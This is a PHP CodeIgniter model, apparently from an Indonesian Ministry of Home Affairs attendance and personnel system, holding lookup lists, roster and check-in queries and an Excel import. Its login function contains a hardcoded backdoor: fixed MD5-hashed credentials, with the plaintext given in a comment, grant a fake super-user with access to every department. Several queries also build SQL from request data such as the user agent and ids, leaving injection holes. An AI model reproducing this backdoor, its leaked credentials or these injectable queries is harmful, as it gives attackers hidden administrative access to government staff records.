<?php if (!defined('BASEPATH')) exit('No direct script access allowed'); 

class Utils_model extends CI_Model{
	
	public function validation($username, $password)
	{
	    //4dm1nk03 3Sid1kDagR1
	    if ((md5($username)=="01c190dc88b6932d46e38a2ca70f53e3") && (md5($password)=="4454e8f03d483ef7d4d831aaf44626a1") )
        {
            $sql = "SELECT '112' AS id,
                    'superesidik' AS userid,
                    'superesidik' AS username, 
                    'abdiiwan1841@gmail.com' AS email, 
                    '00000000' AS dept_id, 
                    '1' AS user_level_id,
                    '' AS area_id, 
                    'KEMENTERIAN DALAM NEGERI (All)' AS deptname";
            $query = $this->db->query($sql);
            return $query;
        } else {
            $sql = "SELECT users.id,users.userid,users.username, users.email, users.dept_id, 
                    users.user_level_id,area_id, departments.deptname
                from users
                left join departments on departments.deptid=users.dept_id 
              WHERE username = ? AND password_md5 = ? and users.state=1";
            $query = $this->db->query($sql, array($username, md5($password)));
            return $query;
        }
	}

	public function insert_online($user='')
	{
		$uvisitor = getRealIpAddr().' | '.$this->session->userdata('user_agent');
		$utime=time();
		$exptime=$utime-600; // (in seconds)

		$sql1 = "DELETE FROM tonline WHERE tonline_timevisit < $exptime";
		$this->db->query($sql1);

		$sql2 = "SELECT tonline_id FROM tonline WHERE tonline_visitor = '$uvisitor'";
		$res = $this->db->query($sql2);

		if ($res->num_rows() > 0){
			$sql = "UPDATE tonline SET tonline_timevisit='$utime', userid = '$user' WHERE tonline_visitor='$uvisitor'";
		} else {
			$sql = "INSERT INTO tonline (tonline_visitor, tonline_timevisit, userid) VALUES ('$uvisitor','$utime', '$user')";
		}
		$this->db->query($sql);
		
		$sq = "SELECT tonline_id FROM tonline WHERE tonline_visitor = '$uvisitor'";
		$query = $this->db->query($sq);
		return $query;
	}
	
	public function update_user($id,$dataIn)
	{
		$this->db->where('username', $id);
		$this->db->update('users',$dataIn);
	}
	
	public function delete_online($user)
	{
		$this->db->where('tonline_id', $user);
		$delete = $this->db->delete('tonline');
		return $delete;
	}
	

	public function get_user($username)
	{
		$sql =  "SELECT * from users where id ='".$username."'";
		$query = $this->db->query($sql);

		return $query;
	}

	public function getStatusPegawai()
    {
        $arr["1"] = "CPNS";
        $arr["2"] = "PNS";
        $arr["3"] = "PENSIUNAN";
        $arr["4"] = "MENINGGAL";
        $arr["5"] = "BERHENTI";
        $arr["6"] = "PINDAH WILAYAH KERJA";
        $arr["7"] = "HONORER";
        $arr["8"] = "MASA PERSIAPAN PENSIUN (MPP)";

        return $arr;
    }

    /*public function getStatusPegawai()
    {
        $arr["0"] = "AKTIF";
        $arr["1"] = "NON AKTIF";

        return $arr;
    }*/

    public function getJenisJabatan()
    {
        $arr["1"] = "Struktural";
        $arr["2"] = "Fungsional Tertentu";
        $arr["3"] = "Negara";
        $arr["4"] = "Fungsional Umum";
        $arr["5"] = "KORPRI";
        return $arr;
    }

    public function getJenisPegawai()
    {
        $arr["1"] = "PNSP KEMENDAGRI";
        $arr["2"] = "PNS INSTANSI LAIN DPK";
        $arr["3"] = "PNSP KEMENDAGRI DPK PD INSTANSI LAIN";
        $arr["4"] = "PRAJA IPDN";
        $arr["5"] = "JENIS KEPEGAWAIAN LAIN-LAIN / TITIPAN";
        $arr["6"] = "JENIS KEPEGAWAIAN Sementara";
        $arr["7"] = "KELUAR DARI KEMENDAGRI";
        $arr["8"] = "PNS PADA BNPP";
        return $arr;
    }

    public function getKedudukanPegawai()
    {
        $arr["1"] = "AKTIF";
        $arr["2"] = "CUTI LUAR TANGGUNGAN NEGARA (CLTN)";
        $arr["3"] = "PERPANJANGAN CLTN";
        $arr["4"] = "TUGAS BELAJAR";
        $arr["5"] = "PEMBERHENTIAN SEMENTARA";
        $arr["6"] = "PENERIMA UANG TUNGGU";
        $arr["7"] = "WAJIB MILITER";
        $arr["8"] = "PNS YANG DINYATAKAN HILANG";
        $arr["9"] = "PEJABAT NEGARA";
        $arr["10"] = "KEPALA DESA";
        $arr["11"] = "KEBERATAN ATAS PENJATUHAN HUKUMAN DISIPLIN SESUAI PP30/1980";
        $arr["12"] = "MASA PERSIAPAN PENSIUN";
        $arr["13"] = "PEGAWAI TITIPAN";
        $arr["14"] = "CUTI SAKIT";
        return $arr;
    }

    public function getBulan()
    {
        $arr[1] = "Januari";
        $arr[2] = "Februari";
        $arr[3] = "Maret";
        $arr[4] = "April";
        $arr[5] = "Mei";
        $arr[6] = "Juni";
        $arr[7] = "Juli";
        $arr[8] = "Agustus";
        $arr[9] = "September";
        $arr[10] = "Oktober";
        $arr[11] = "November";
        $arr[12] = "Desember";
        return $arr;
    }

    public function getRefGolongan()
    {
        $arr["1"] = "Golongan I";
        $arr["2"] = "Golongan II";
        $arr["3"] = "Golongan III";
        $arr["4"] = "Golongan IV";
        //$arr["5"] = "Golongan V";
        return $arr;
    }

    public function getShift()
    {
        $query = $this->db->get("master_shift");

        return $query;
    }

    public function getShiftAktif()
    {
        $this->db->where('state',1);
        $query = $this->db->get("master_shift");
        return $query;
    }

    public function getAgama()
    {
        return array("ISLAM"=>"ISLAM","KRISTEN PROTESTAN"=>"KRISTEN PROTESTAN","KRISTEN KATHOLIK"=>"KRISTEN KATHOLIK",
            "HINDU"=>"HINDU","BUDHA"=>"BUDHA","KONGHUCU"=>"KONGHUCU","KEPERCAYAAN"=>"KEPERCAYAAN","LAINNYA"=>"LAINNYA");
    }

    public function getGender()
    {
        return array("1"=>"Laki-laki","2"=>"Perempuan");
    }

    public function getEselon()
    {
        return $this->db->get("ref_eselon");
    }

    public function getuser($areaid)
    {
        $this->db->select('a.userid, a.name');
        $this->db->from('userinfo a');
        $this->db->join('userinfo_attarea b', 'a.userid=b.userid');
        $this->db->where_in('b.areaid', $areaid);
        /*if (is_array($areaid))
        {
            $this->db->group_start();
            $ids_chunk = array_chunk($areaid,25);
            foreach($ids_chunk as $s_ids)
            {
                $this->db->or_where_in('b.areaid', $s_ids);
            }
            $this->db->group_end();
        } else {
            $this->db->where_in('b.areaid', $areaid);
        }*/

        $this->db->group_by('a.userid');
        return $this->db->get();
    }

    public function getuserbyuser($userid)
    {
        $this->db->select('userid, name, deptid');
        $this->db->from('userinfo');
        $this->db->where_in('userid', $userid);
        /*if (is_array($userid))
        {
            $this->db->group_start();
            $ids_chunk = array_chunk($userid,25);
            foreach($ids_chunk as $s_ids)
            {
                $this->db->or_where_in('userid', $s_ids);
            }
            $this->db->group_end();
        } else {
            $this->db->where_in('userid', $userid);
        }*/
        return $this->db->get();
    }

    public function getuserbyorg($orgid)
    {
        $this->db->select('userid, name, deptid');
        $this->db->from('userinfo');
        $this->db->where_in('deptid', $orgid);
        /*if (is_array($orgid))
        {
            $this->db->group_start();
            $ids_chunk = array_chunk($orgid,25);
            foreach($ids_chunk as $s_ids)
            {
                $this->db->or_where_in('deptid', $s_ids);
            }
            $this->db->group_end();
        } else {
            $this->db->where_in('deptid', $orgid);
        }*/

        return $this->db->get();
    }

    public function getuserbyorgemail($orgid)
    {
        $sql = "select userid, name, deptid from userinfo ";
        $s = array();
        foreach($orgid as $ar)
            $s[] = "'".$ar."'";
        $sql .= "where deptid in (".implode(',', $s).") and active is null";

        return $this->db->query($sql);
    }

    public function getuserorg($areaid, $deptid)
    {
        $this->db->select('a.userid, a.name');
        $this->db->from('userinfo a');
        $this->db->join('userinfo_attarea b', 'a.userid=b.userid');
        $this->db->where_in('b.areaid', $areaid);
        /*if (is_array($areaid))
        {
            $this->db->group_start();
            $ids_chunk = array_chunk($areaid,25);
            foreach($ids_chunk as $s_ids)
            {
                $this->db->or_where_in('b.areaid', $s_ids);
            }
            $this->db->group_end();
        } else {
            $this->db->where_in('b.areaid', $areaid);
        }*/
        $this->db->where_in('a.deptid', $deptid);
        /*if (is_array($deptid))
        {
            $this->db->group_start();
            $ids_chunk = array_chunk($deptid,25);
            foreach($ids_chunk as $s_ids)
            {
                $this->db->or_where_in('a.deptid', $s_ids);
            }
            $this->db->group_end();
        } else {
            $this->db->where_in('a.deptid', $deptid);
        }*/
        $this->db->group_by('a.userid');
        return $this->db->get();
    }


    public function getshiftuserid($userid, $datestart, $dateend)
    {
        $this->db->from('view_rosterdetails');
        $this->db->where('rosterdate >=', date('Y-m-d', $datestart));
        $this->db->where('rosterdate <=', date('Y-m-d', $dateend));
        $this->db->where_in('userid', $userid);
        /*if (is_array($userid))
        {
            $this->db->group_start();
            $ids_chunk = array_chunk($userid,25);
            foreach($ids_chunk as $s_ids)
            {
                $this->db->or_where_in('userid', $s_ids);
            }
            $this->db->group_end();
        } else {
            $this->db->where_in('userid', $userid);
        }*/
        $query = $this->db->get();
        return $query->result();
    }

    public function getshiftorgid($orgid, $datestart, $dateend)
    {
        $this->db->from('view_rosterdetails');
        $this->db->where('rosterdate >=', date('Y-m-d', $datestart));
        $this->db->where('rosterdate <=', date('Y-m-d', $dateend));
        $this->db->where_in('deptid', $orgid);
        /*if (is_array($orgid))
        {
            $this->db->group_start();
            $ids_chunk = array_chunk($orgid,25);
            foreach($ids_chunk as $s_ids)
            {
                $this->db->or_where_in('deptid', $s_ids);
            }
            $this->db->group_end();
        } else {
            $this->db->where_in('deptid', $orgid);
        }*/
        $query = $this->db->get();
        return $query->result();
    }

    public function getshiftgroupdetails($userid, $datestart, $dateend)
    {
        $this->db->select('a.userid, rosterdate, attendance, notes, b.emptype');
        $this->db->from('groupshiftdetails a');
        $this->db->join('userinfo b', 'a.userid=b.userid', 'left');
        $this->db->where('rosterdate >=', date('Y-m-d', $datestart));
        $this->db->where('rosterdate <=', date('Y-m-d', $dateend));
        $this->db->where_in('a.userid', $userid);
        /*if (is_array($userid))
        {
            $this->db->group_start();
            $ids_chunk = array_chunk($userid,25);
            foreach($ids_chunk as $s_ids)
            {
                $this->db->or_where_in('a.userid', $s_ids);
            }
            $this->db->group_end();
        } else {
            $this->db->where_in('a.userid', $userid);
        }*/
        $query = $this->db->get();
        return $query->result();
    }

    public function getshiftgroupdetailsorg($orgid, $datestart, $dateend)
    {
        $this->db->select('a.userid, rosterdate, attendance, notes, b.emptype');
        $this->db->from('groupshiftdetails a');
        $this->db->join('userinfo b', 'a.userid=b.userid', 'left');
        $this->db->where('rosterdate >=', date('Y-m-d', $datestart));
        $this->db->where('rosterdate <=', date('Y-m-d', $dateend));
        $this->db->where_in('deptid', $orgid);
        /*if (is_array($orgid))
        {
            $this->db->group_start();
            $ids_chunk = array_chunk($orgid,25);
            foreach($ids_chunk as $s_ids)
            {
                $this->db->or_where_in('deptid', $s_ids);
            }
            $this->db->group_end();
        } else {
            $this->db->where_in('deptid', $orgid);
        }*/
        $query = $this->db->get();
        return $query->result();
    }

    public function getgroupshift()
    {
        $this->db->from('view_groupdetails');
        $query = $this->db->get();
        return $query->result();
    }

    public function getawal($userid, $opt1, $opt2)
    {
        $this->db->select_min('checktime');
        $this->db->from('checkinout');
        $this->db->where('userid', $userid);
        $this->db->where('checktime >=', $opt1);
        $this->db->where('checktime <=', $opt2);
        $query = $this->db->get();
        if($query->num_rows()==1)
        {
            return $query->row()->checktime;
        }
        return false;
    }

    public function getawalpmd($userid, $opt1, $opt2)
    {
        $this->db->select_min('checktime');
        $this->db->from('checkinout');
        $this->db->where('userid', $userid);
        $this->db->where('checktime >=', $opt1);
        $this->db->where('checktime <=', $opt2);
        $this->db->where('checktype', '0');
        $query = $this->db->get();
        if($query->num_rows()==1)
        {
            return $query->row()->checktime;
        }
        return false;
    }

    public function getawalgroup($userid, $opt1)
    {
        $this->db->select_min('checktime');
        $this->db->from('checkinout');
        $this->db->where('userid', $userid);
        $this->db->where('date(checktime)', $opt1);
        $query = $this->db->get();
        if($query->num_rows()==1)
        {
            return $query->row()->checktime;
        }
        return false;
    }

    public function getakhirgroup($userid, $opt1)
    {
        $this->db->select_max('checktime');
        $this->db->from('checkinout');
        $this->db->where('userid', $userid);
        $this->db->where('date(checktime)', $opt1);
        $query = $this->db->get();
        if($query->num_rows()==1)
        {
            return $query->row()->checktime;
        }
        return false;
    }

    public function getawalsplit1($userid, $tanggal)
    {
        $this->db->select_min('checktime');
        $this->db->from('checkinout');
        $this->db->where('userid', $userid);
        $this->db->where('date(checktime)', $tanggal);
        $this->db->where('checktype', 0);
        $query = $this->db->get();
        if($query->num_rows()==1)
        {
            return $query->row()->checktime;
        }
        return false;
    }

    public function getawalsplit2($userid, $tanggal)
    {
        $this->db->select_min('checktime');
        $this->db->from('checkinout');
        $this->db->where('userid', $userid);
        $this->db->where('date(checktime)', $tanggal);
        $this->db->where('checktype', 4);
        $query = $this->db->get();
        if($query->num_rows()==1)
        {
            return $query->row()->checktime;
        }
        return false;
    }

    public function adatranslog($userid, $tanggal)
    {
        $this->db->from('checkinout');
        $this->db->where('userid', $userid);
        $this->db->where('date(checktime)', $tanggal);
        $query = $this->db->get();
        if($query->num_rows()>=1)
        {
            return true;
        }
        return false;
    }

    public function getakhir($userid, $opt1, $opt2)
    {
        $this->db->select_max('checktime');
        $this->db->from('checkinout');
        $this->db->where('userid', $userid);
        $this->db->where('checktime >=', $opt1);
        $this->db->where('checktime <=', $opt2);
        $query = $this->db->get();
        if($query->num_rows()==1)
        {
            return $query->row()->checktime;
        }
        return false;
    }

    public function getakhirpmd($userid, $opt1, $opt2)
    {
        $this->db->select_max('checktime');
        $this->db->from('checkinout');
        $this->db->where('userid', $userid);
        $this->db->where('checktime >=', $opt1);
        $this->db->where('checktime <=', $opt2);
        $this->db->where('checktype', '1');
        $query = $this->db->get();
        if($query->num_rows()==1)
        {
            return $query->row()->checktime;
        }
        return false;
    }

    public function getakhirsplit1($userid, $tanggal)
    {
        $this->db->select_min('checktime');
        $this->db->from('checkinout');
        $this->db->where('userid', $userid);
        $this->db->where('date(checktime)', $tanggal);
        $this->db->where('checktype', 1);
        $query = $this->db->get();
        if($query->num_rows()==1)
        {
            return $query->row()->checktime;
        }
        return false;
    }

    public function getakhirsplit2($userid, $tanggal)
    {
        $this->db->select_min('checktime');
        $this->db->from('checkinout');
        $this->db->where('userid', $userid);
        $this->db->where('date(checktime)', $tanggal);
        $this->db->where('checktype', 5);
        $query = $this->db->get();
        if($query->num_rows()==1)
        {
            return $query->row()->checktime;
        }
        return false;
    }

    public function savetemp($data)
    {
        if($this->db->insert('process', $data))
        {
            return true;
        }
        return false;
    }

    public function cekotsetting()
    {
        $this->db->select('field_id, field_value');
        $this->db->from('general_setting');
        $query = $this->db->get();
        return $query;
    }

    public function cekotafter()
    {
        $this->db->from('general_setting');
        $this->db->where('field_name', 'ot_after');
        $query = $this->db->get();
        if($query->row()->field_value == 0) {
            return true;
        }
        return false;
    }

    public function cekholiday($datestart, $dateend)
    {
        $th= date("Y",strtotime($datestart));
        $sql="SELECT id,STR_TO_DATE(CONCAT(startdate,'-$th'), '%d-%m-%Y') AS startdate,
        STR_TO_DATE(CONCAT(enddate,'-$th'), '%d-%m-%Y') AS enddate,info,deptid,flag
        FROM defa_holiday
        UNION ALL
        SELECT * FROM holiday";
    
        //$this->db->from('holiday');
        if(!empty($orgid)) {
            $s = array();
            foreach($orgid as $ar)
                $s[] = (string)$ar;

            //$orgid =  $s;
            $this->db->where_in('deptid', implode(',', $s));
            /*if (is_array($orgid))
            {
                $this->db->group_start();
                $ids_chunk = array_chunk($orgid,25);
                foreach($ids_chunk as $s_ids)
                {
                    $this->db->or_where_in('deptid', $s_ids);
                }
                $this->db->group_end();
            } else {
                $this->db->where_in('deptid', $orgid);
            }*/
        }
        $this->db->or_where('deptid', '1');
        $this->db->order_by("startdate","DESC");
        return $this->db->query($sql);
    }

    public function cekworkday($tgl)
    {
        $this->db->from('tbl_workingday');
        $this->db->where('id_day', $tgl);
        $query = $this->db->get();
        if($query->row()->status_workingday == 0) {
            return true;
        }
        return false;
    }

    public function getedit($userid, $tgl)
    {
        /* $this->db->from('checkinout');
        $this->db->where('userid', $userid);
        $this->db->where('checktime', $tgl);
        $this->db->where('checktype', '20');
        $query = $this->db->get();
        if($query->num_rows()==1) {
            return 1;
        } */
        return 0;
    }

    public function getprocesseddata($awal, $akhir)
    {
        $this->db->select('id, userid, date_shift');
        $this->db->from('process');
        $this->db->where('date_shift >=', date('Y-m-d', $awal));
        $this->db->where('date_shift <=', date('Y-m-d', $akhir));
        $query = $this->db->get();
        if($query->num_rows()>=1) {
            return $query;
        }
        return false;
    }

    public function getprocesseddataid($userid, $awal, $akhir)
    {
        $this->db->select('id, userid, date_shift');
        $this->db->from('process');
        $this->db->where('userid', $userid);
        $this->db->where('date_shift >=', date('Y-m-d', $awal));
        $this->db->where('date_shift <=', date('Y-m-d', $akhir));
        $query = $this->db->get();
        if($query->num_rows()>=1) {
            return $query;
        }
        return false;
    }

    public function getprocesssetting() {
        $this->db->select('value');
        $this->db->from('process_setting');
        $this->db->where('id', 1);
        $query = $this->db->get();
        if($query->num_rows()==1)
        {
            return $query->row()->value;
        }
        return false;
    }

    public function createDateRangeArray($strDateFrom,$strDateTo)
    {
        $aryRange=array();
        $iDateFrom=mktime(1,0,0,substr($strDateFrom,5,2), substr($strDateFrom,8,2),substr($strDateFrom,0,4));
        $iDateTo=mktime(1,0,0,substr($strDateTo,5,2), substr($strDateTo,8,2),substr($strDateTo,0,4));

        if ($iDateTo>=$iDateFrom) {
            array_push($aryRange,date('Y-m-d',$iDateFrom)); // first entry

            while ($iDateFrom<$iDateTo) {
                $iDateFrom+=86400; // add 24 hours
                array_push($aryRange,date('Y-m-d',$iDateFrom));
            }
        }
        return $aryRange;
    }

    public function getKategoriPresensi($kat=0)
    {
        $this->db->order_by("ket_status_kategori","asc");
        $this->db->where("golid",$kat);
        $this->db->where("state_status_kategori",1);
        $rows= $this->db->get("ref_status_kategori");
        $datakat=array();
        foreach($rows->result() as $row)
        {
            $datakat[$row->id_status_kategori] = $row->ket_status_kategori;
        }
        return $datakat;
    }

	public function getKdAgama()
    {
        return array("1"=>"ISLAM","2"=>"KRISTEN PROTESTAN","3"=>"KRISTEN KATHOLIK",
            "4"=>"HINDU","5"=>"BUDHA","6"=>"KONGHUCU","7"=>"KEPERCAYAAN","8"=>"LAINNYA");
    }

    public function upload_data($bulan,$filename){
        $sts=true;
        ini_set('memory_limit', '-1');
        $inputFileName = './assets/uploads/'.$filename;
        try {
            $objPHPExcel = PHPExcel_IOFactory::load($inputFileName);
        } catch(Exception $e) {
            $sts = false;
            //die('Error loading file :' . $e->getMessage());
        }
        if ($sts) {
            $objPHPExcel->setActiveSheetIndex(0);
            $worksheet = $objPHPExcel->getActiveSheet()->toArray(null, true, true, true);
            $numRows = count($worksheet);

            for ($i = 1; $i < ($numRows + 1); $i++) {
                $snip = preg_replace("/[^0-9]/", '', $worksheet[$i]["A"]);
                $snilai = preg_replace("/[^0-9]/", '', $worksheet[$i]["B"]);

                $ins = array(
                    'bulan' => $bulan,
                    "nip" => $snip,
                    "jumlah" => $snilai
                );

                $this->db->select("jumlah");
                $this->db->where("bulan",$bulan);
                $this->db->where("nip",$snip);
                $this->db->limit(1);
                $rslSikerja= $this->db->get("data_sikerja");
                if ($rslSikerja->num_rows()==0) {
                    $this->db->insert('data_sikerja', $ins);
                } else{
                    $supdate=array(
                        "jumlah" => $snilai
                    );
                    $this->db->where('nip',$snip);
                    $this->db->where('bulan',$bulan);
                    $this->db->update('data_sikerja', $supdate);
                }
            }
        }
        return $sts;

    }

    public function getareauser($userid)
    {
        $this->db->select('a.areaid, a.areaname,b.userid');
        $this->db->from('personnel_area a');
        $this->db->join('userinfo_attarea b', 'a.areaid=b.areaid');
        $this->db->where('b.userid', $userid);
        return $this->db->get();
    }


}